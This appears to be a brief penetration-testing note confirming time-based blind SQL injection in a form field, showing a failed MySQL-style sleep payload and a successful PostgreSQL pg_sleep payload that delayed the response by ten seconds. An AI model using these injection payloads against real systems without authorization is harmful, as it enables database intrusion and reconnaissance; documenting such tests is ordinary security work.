Just needs to prove the field is blind-injectable using delays.

```
' || (SELECT sleep(10))--
```
didn't do anything - wrong syntax for this DB.

```
' || (SELECT pg_sleep(10))--
```
this one delayed the response by 10s, so it's Postgres. Confirmed vulnerable.
